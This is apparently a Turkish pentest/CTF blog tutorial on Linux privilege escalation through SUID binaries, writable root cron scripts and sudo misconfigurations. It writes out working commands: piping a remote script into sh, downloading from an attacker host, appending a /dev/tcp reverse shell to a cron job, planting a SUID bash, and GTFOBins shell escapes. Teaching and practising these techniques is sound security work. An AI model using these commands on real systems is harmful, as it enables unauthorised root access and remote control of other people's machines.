Linux Privilege Escalation:
SUID, Cron Jobs ve Sudo Zafiyetleri

28 Mart 2026 | Linux Security | 15 dk okuma | 0xBlog Yazarı
Linux Privilege Escalation SUID CTF Pentest

Bir sisteme düşük yetkili kullanıcı olarak ayak bastınız. Peki bundan sonra ne yaparsınız? Privilege Escalation (PrivEsc), mevcut düşük yetkili erişimi root veya daha yüksek yetkili bir kullanıcıya yükseltme sürecidir. Bu yazı, gerçek CTF ve pentest senaryolarında en sık karşılaşılan üç vektörü detaylı olarak ele alır.

⚠ Yasal Uyarı: Bu teknikler yalnızca izin verilmiş ortamlarda (CTF, lab, yetkili pentest) kullanılmalıdır.

Keşif Aşaması: LinPEAS ile Başla

Manuel keşiften önce LinPEAS çalıştırarak sistemi otomatik taratmak zaman kazandırır. Renk kodlamasıyla kritik bulguları hemen işaretler.

Bash — LinPEAS 
# Hedef makinede internet varsa:
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Yoksa saldırı makinenizden transfer edin:
# Saldırı makinesinde:
python3 -m http.server 8080

# Hedef makinede:
wget http://<ATTACKER_IP>:8080/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh | tee /tmp/linpeas_output.txt

Vektör 1: SUID Bit İstismarı

SUID (Set User ID) biti olan bir ikili dosya, dosyayı çalıştıran kullanıcıdan bağımsız olarak dosyanın sahibinin yetkisiyle çalışır. Eğer sahip root ise ve dosya tehlikeli işlevler içeriyorsa, bu bir PrivEsc vektörüdür.

Bash — SUID Keşfi 
# SUID bitli root'a ait tüm ikilileri listele
find / -perm -4000 -user root -type f 2>/dev/null

# Örnek tehlikeli çıktılar:
# /usr/bin/find
# /usr/bin/vim.basic
# /usr/bin/python3.8
# /usr/bin/nmap  (eski sürümlerde)
Bash — find SUID İstismarı (GTFOBins) 
# /usr/bin/find SUID bitli ise:
find . -exec /bin/sh -p \; -quit
# -p flag'i SUID yetkisini korur → root shell

# vim SUID bitli ise:
vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'

# python3 SUID bitli ise:
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
ⓘ GTFOBins: SUID, sudo ve diğer PrivEsc tekniklerinin kapsamlı listesi için gtfobins.github.io adresine başvurun.

Vektör 2: Cron Job Zafiyetleri

Root'un çalıştırdığı bir cron job, yazılabilir bir script'e veya yazılabilir bir PATH konumundaki ikili dosyaya atıfta bulunuyorsa, bu script'e zararlı komut ekleyerek root yetkisi ele geçirilir.

Bash — Cron İnceleme 
# Sistem geneli crontab'ları incele
cat /etc/crontab
cat /etc/cron.d/*
ls -la /var/spool/cron/crontabs/

# Örnek zararlı crontab satırı:
# * * * * * root /opt/scripts/backup.sh

# Script'in izinlerini kontrol et:
ls -la /opt/scripts/backup.sh
# -rwxrwxrwx → dünya tarafından yazılabilir = kritik zafiyet
Bash — Cron İstismarı 
# Backup script'e reverse shell ekle:
echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' >> /opt/scripts/backup.sh

# Saldırı makinenizde listener başlatın:
nc -lvnp 4444

# Cron her dakika çalışır → 60 saniye içinde root shell gelir

# Alternatif: SUID bash yerleştirme
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /opt/scripts/backup.sh
# Cron çalıştıktan sonra:
/tmp/rootbash -p

Vektör 3: Sudo Yanlış Yapılandırmaları

Bash — Sudo İnceleme 
# Mevcut kullanıcının sudo yetkilerini listele
sudo -l

# Örnek tehlikeli çıktılar:
# (ALL) NOPASSWD: /usr/bin/find
# (ALL) NOPASSWD: /usr/bin/vim
# (ALL) NOPASSWD: /usr/bin/awk
# (ALL) NOPASSWD: ALL   ← en tehlikeli, direkt sudo su
Bash — Sudo İstismar Örnekleri 
# ── vim ile shell alma ──
sudo vim -c ':!/bin/bash'

# ── awk ile komut çalıştırma ──
sudo awk 'BEGIN {system("/bin/bash")}'

# ── less ile shell ──
sudo less /etc/passwd
# less içinde: !/bin/bash

# ── tar ile komut çalıştırma ──
sudo tar -cf /dev/null /dev/null --checkpoint=1 \
  --checkpoint-action=exec=/bin/bash

# ── env ile ortam değişkeni bypass ──
sudo env /bin/bash
terminal — sudo -l çıktısı ve shell alma
